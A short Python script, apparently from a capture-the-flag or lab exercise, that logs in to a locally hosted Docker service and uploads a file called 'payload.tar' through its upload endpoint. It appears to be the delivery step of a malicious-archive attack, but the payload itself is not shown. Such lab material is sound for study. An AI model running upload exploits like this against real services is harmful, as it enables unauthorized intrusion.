import requests
import tarfile

SERVER_ADDR = "http://127.0.0.1:5000" # change this to whatever the docker is running at

def get_cookie():
    data = {
        "username": "test", # make this user first
        "password": "test" 
    }

    req = requests.post(SERVER_ADDR+"/login", data=data)
    cookiejar = req.history[0].cookies
    cookie = cookiejar.get_dict()['session']

    return cookie

cookie = {"session": get_cookie()}

with open('payload.tar', 'rb') as f:
    r = requests.post(url=SERVER_ADDR + "/upload", files={"file": ('payload.tar', f)}, cookies=cookie)
